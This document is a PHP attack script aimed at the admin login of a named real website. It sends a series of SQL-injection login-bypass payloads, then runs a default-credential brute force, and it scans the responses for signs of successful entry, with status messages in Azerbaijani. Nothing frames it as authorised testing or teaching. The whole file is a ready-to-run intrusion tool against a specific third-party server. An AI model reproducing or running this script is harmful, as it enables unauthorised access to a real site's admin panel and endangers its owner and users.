<?php
/**
 * Admin Panel SQL Injection Bypass
 * Target: https://royzasmm.com.tr/admin/
 * Method: POST
 */

class AdminBypass {
    private $target = "https://royzasmm.com.tr/admin/";
    private $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    
    // SQL Injection Payloads
    private $payloads = [
        "username=admin' OR 1=1--&password=test&remember=1",
        "username=admin' OR '1'='1'--&password=test&remember=1",
        "username=admin' OR 1=1#&password=test&remember=1",
        "username=admin' OR '1'='1'#&password=test&remember=1",
        "username=admin' OR 1=1/*&password=test&remember=1",
        "username=admin&password=' OR '1'='1'--&remember=1",
        "username=admin' OR 1=1 OR '1'='1'--&password=test&remember=1"
    ];
    
    public function testPayloads() {
        echo "=== ADMIN PANEL SQL INJECTION BYPASS ===\n";
        echo "Target: {$this->target}\n";
        echo "Method: POST\n\n";
        
        foreach ($this->payloads as $index => $payload) {
            echo "Test {$index + 1}: {$payload}\n";
            $response = $this->sendRequest($payload);
            $this->analyzeResponse($response, $index + 1);
            echo "----------------------------------------\n";
            sleep(1); // Rate limiting
        }
    }
    
    private function sendRequest($payload) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->target,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => $this->userAgent,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'body' => $response,
            'http_code' => $httpCode
        ];
    }
    
    private function analyzeResponse($response, $testNumber) {
        $body = $response['body'];
        $httpCode = $response['http_code'];
        
        echo "HTTP Code: {$httpCode}\n";
        
        // Username found message
        if (strpos($body, "username you entered was found") !== false) {
            echo "✅ Username Found: SQL Injection mümkündür!\n";
        }
        
        // Admin panel content
        if (strpos($body, "admin") !== false || strpos($body, "dashboard") !== false) {
            echo "✅ Admin Content: Admin panelə giriş mümkündür!\n";
        }
        
        // Error messages
        if (strpos($body, "error") !== false) {
            echo "⚠️ Error: Xəta mesajı tapıldı\n";
        }
        
        // Success indicators
        if (strpos($body, "success") !== false || strpos($body, "welcome") !== false) {
            echo "🎉 Success: Uğurlu giriş!\n";
        }
        
        // Response length
        echo "Response Length: " . strlen($body) . " bytes\n";
    }
    
    public function bruteForce() {
        echo "\n=== BRUTE FORCE ATTACK ===\n";
        
        $usernames = ['admin', 'administrator', 'root', 'user', 'test'];
        $passwords = ['admin', 'password', '123456', 'admin123', 'root'];
        
        foreach ($usernames as $username) {
            foreach ($passwords as $password) {
                echo "Testing: {$username}:{$password}\n";
                $payload = "username={$username}&password={$password}&remember=1";
                $response = $this->sendRequest($payload);
                
                if (strpos($response['body'], "username you entered was found") !== false) {
                    echo "✅ Username Found: {$username}\n";
                }
                
                sleep(1);
            }
        }
    }
}

// Usage
if (php_sapi_name() === 'cli') {
    $bypass = new AdminBypass();
    $bypass->testPayloads();
    $bypass->bruteForce();
} else {
    echo "Bu script terminal-də işlədilməlidir!";
}
?>